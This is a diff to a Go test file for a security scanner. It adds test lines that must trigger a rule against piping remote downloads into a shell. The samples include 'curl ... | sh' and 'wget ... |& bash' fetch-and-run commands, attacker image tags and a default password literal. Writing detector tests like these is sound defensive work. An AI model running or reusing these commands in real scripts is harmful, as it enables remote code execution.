@@ -154,6 +154,8 @@ func TestSecurityTriageRulesCoverDynamicImagesAndTrackedText(t *testing.T) {
 	}{
 		{name: "docs/design.md", line: "curl https://example.invalid/install | sh", rule: "REMOTE_SCRIPT_PIPE"},
 		{name: "scripts/install.sh", line: "curl https://example.invalid/install \\\n| sh", rule: "REMOTE_SCRIPT_PIPE"},
+		{name: "scripts/install.sh", line: "curl https://example.invalid/install |\nsh", rule: "REMOTE_SCRIPT_PIPE"},
+		{name: "scripts/install.sh", line: "wget https://example.invalid/install |&\nbash", rule: "REMOTE_SCRIPT_PIPE"},
 		{name: "compose.yml", line: "image: ${IMAGE:-attacker/image:latest}", rule: "MUTABLE_EXTERNAL_IMAGE"},
 		{name: "compose.yml", line: "image: bee-lab-evil:latest", rule: "MUTABLE_EXTERNAL_IMAGE"},
 		{name: "config.txt", line: "password=changeme", rule: "DEFAULT_CREDENTIAL_LITERAL"},
@@ -177,6 +179,14 @@ func TestSecurityTriageShellContinuationsAreBoundedAndRequireAnUnescapedBackslas
 	}
 	if len(findings) != 0 {
 		t.Fatalf("escaped backslash must not join shell lines: %#v", findings)
+	}
+
+	findings, err = scanSecurityFile("scripts/install.sh", "printf 'curl https://example.invalid/install |'\nsh")
+	if err != nil {
+		t.Fatal(err)
+	}
+	if len(findings) != 0 {
+		t.Fatalf("quoted pipe must not join shell lines: %#v", findings)
 	}
 
 	oversized := strings.Repeat("x", 600_000) + "\\\n" + strings.Repeat("y", 600_000)
